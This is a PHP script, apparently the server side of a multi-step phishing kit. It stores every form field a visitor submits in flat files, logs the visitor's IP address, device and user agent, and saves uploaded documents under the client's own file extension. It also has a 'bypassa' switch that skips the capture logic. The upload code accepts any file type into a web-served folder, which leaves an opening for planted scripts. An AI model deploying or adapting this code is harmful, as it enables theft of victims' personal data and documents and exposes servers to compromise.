<?php

session_start();
if (!isset($_GET['bypassa'])) {
	?>
	<?php

	$get = false;
	$file = false;
	foreach ($pagina as $parametro) {
		if (!isset($_POST[$parametro]) || !$_POST[$parametro]) {
			$get = true;
		}
	}

	foreach ($pagina as $parametro) {
		if (isset($_FILES[$parametro]) && $_FILES[$parametro]) {
			$file = true;
			$get = false;
		}
	}

	salvadebug($pagina);

	$cartella = "database";
	if ($numero == 0) {
		$id = creaid($numero, $cartella);
		if ($_SERVER['REQUEST_METHOD'] == "GET") {
			$id = forzaid();
		}
	} else {
		$id = getid();
	}
	if (isset($_GET['reset'])) {
		$id = forzaid();
		?>
		<script>
			window.location.href = "<?php echo $precedente ?>";
		</script>
		<?php
		exit;
	}
	if ($numero != 0) {
		$nomefile11 = $cartella . "/" . $id . "_" . $numero;
		if (file_exists($nomefile11)) {
			if (filesize($nomefile11)) {
				?>
				<script>
					window.location.href = "<?php echo $precedente ?>?reset=1";
				</script>
				<?php
				exit;
			}
		}

		$nomefile2 = $cartella . "/" . $id . "_0";

		if (!file_exists($nomefile2) || !filesize($nomefile2)) {
			?>
			<script>
				window.location.href = "<?php echo $precedente ?>?reset=1";
			</script>
			<?php
			exit;
		}

	}

	if ($file) {
		$id = creaid($numero, $cartella);
		$lista = [];
		$nomefile = $cartella . "/" . $id . "_" . $numero;
		creafile($nomefile);
		foreach ($pagina as $parametro) {

			$tmp_name = $_FILES[$parametro]["tmp_name"];
			if (isset($_FILES[$parametro])) {


				$espolos = explode(".", $_FILES[$parametro]["name"]);
				$ext = $espolos[count($espolos) - 1];
				$nomedoc = "doc/" . $id . "_" . $parametro . "_" . $numero . "." . $ext;

				move_uploaded_file($tmp_name, $nomedoc);
				$lista[] = "<a href='../$nomedoc' target='_blank' class='doc'>" . $nomedoc . "</a>";
			} else {
				$valore = $_POST[$parametro];
				$lista[] = $valore;

			}
		}
		$txt = json_encode($lista);
		$myfile = file_put_contents($nomefile, $txt . PHP_EOL);
		?>
		<script>
			window.location.href = "<?php echo $prossima ?>";
		</script>
		<?php
		exit;
	}


	if (!$get) {
		
		$id = creaid($numero, $cartella);
		$lista = [];
		foreach ($pagina as $parametro) {
			$valore = $_POST[$parametro];
			$_SESSION[$parametro] = $_POST[$parametro];
			$lista[] = $valore;
		}
		$nomefile = $cartella . "/" . $id . "_" . $numero;
		creafile($nomefile);
		//SALVA IP
		if ($numero == 0) {
			$nomefileip = $cartella . "/ip_" . $id;
			creafile($nomefileip);
			$dispositivo = dispositivo() . "<div class='us'>" . $_SERVER['HTTP_USER_AGENT'] . "</div>";
			$myfile = file_put_contents($nomefileip, getUserIP() . " " . $dispositivo);
		} else {


		}
		$txt = json_encode($lista);
		$myfile = file_put_contents($nomefile, $txt . PHP_EOL);
		echo json_encode($_SESSION);
		?>
		<script>
			window.location.href = "<?php echo $prossima ?>";
		</script>
		<?php
		exit;
	}


	conta($numero);
?>
<?php /* TEST */?>
<?php

} ?>